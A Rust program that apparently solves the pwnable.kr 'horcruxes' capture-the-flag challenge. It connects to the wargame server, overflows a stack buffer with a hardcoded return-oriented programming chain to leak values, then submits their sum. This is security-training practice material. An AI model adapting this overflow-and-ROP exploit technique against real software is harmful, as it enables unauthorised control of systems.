use std::io::{Read, Write};
use std::net::TcpStream;
use regex::Regex;

const READ_BYTES: usize = 2048;

struct HorcruxesStream {
    stream: TcpStream,
    read_buffer: [u8; READ_BYTES],
    bytes_read: usize,
}
pub fn horcruxes() {
    let mut horcruxes_stream = HorcruxesStream {
        stream: TcpStream::connect("pwnable.kr:9032").unwrap(),
        read_buffer: [0; READ_BYTES],
        bytes_read: 0,
    };

    // Read intro messages
    horcruxes_stream.read_message();
    horcruxes_stream.read_message();

    // Write 0 to select a "menu"
    horcruxes_stream.write_bytes(&mut vec![48]);
    horcruxes_stream.read_message();

    // Attempt to write to the stack to go where we want, this is done with a chain of pointing to the
    // return instruction in A() and going to the address we want to.
    let mut rop_bytes: Vec<u8> = vec![48;120];
    let return_instruction: Vec<u8> = vec![105, 254, 9, 8]; // This is the location of the return instruction in A().
    // Go to A
    rop_bytes.extend(&return_instruction);
    rop_bytes.extend(vec![75, 254, 9, 8]);
    // Go to B
    rop_bytes.extend(&return_instruction);
    rop_bytes.extend(vec![106, 254, 9, 8]);
    // Go to C
    rop_bytes.extend(&return_instruction);
    rop_bytes.extend(vec![137, 254, 9, 8]);
    // Go to D
    rop_bytes.extend(&return_instruction);
    rop_bytes.extend(vec![168, 254, 9, 8]);
    // Go to E
    rop_bytes.extend(&return_instruction);
    rop_bytes.extend(vec![199, 254, 9, 8]);
    // Go to F
    rop_bytes.extend(&return_instruction);
    rop_bytes.extend(vec![230, 254, 9, 8]);
    // Go to G
    rop_bytes.extend(&return_instruction);
    rop_bytes.extend(vec![5, 255, 9, 8]);
    // Go back to the ropme function call in main()
    rop_bytes.extend(&return_instruction);
    rop_bytes.extend(vec![252, 255, 9, 8]);

    horcruxes_stream.write_bytes(&mut rop_bytes);
    horcruxes_stream.read_message(); // Read more experience message
    horcruxes_stream.read_message(); // Read our xp values

    let re = Regex::new(r"-*[0-9]+").unwrap();
    let xp_values_hay = std::str::from_utf8(&horcruxes_stream.read_buffer[..horcruxes_stream.bytes_read]).unwrap();
    let xp_values = re.find_iter(&xp_values_hay).map(|x| x.as_str().parse().unwrap()).collect::<Vec<i32>>();

    let mut sum = 0i32;
    for value in xp_values {
        sum = sum.wrapping_add(value);
    }

    // Write 0 to select a "menu" again
    horcruxes_stream.write_bytes(&mut vec![48]);
    horcruxes_stream.read_message();

    horcruxes_stream.stream.write(sum.to_string().as_bytes()).unwrap();
    horcruxes_stream.stream.write(b"\n").unwrap();

    horcruxes_stream.read_message();
}

impl HorcruxesStream {
    fn read_message(&mut self) {
        self.bytes_read = self.stream.read(&mut self.read_buffer).unwrap();
        println!("{}", std::str::from_utf8(&self.read_buffer[..self.bytes_read]).unwrap());
    }

    fn write_bytes(&mut self, bytes: &mut Vec<u8>) {
        bytes.push('\n' as u8);
        self.stream.write(bytes).unwrap();
    }
}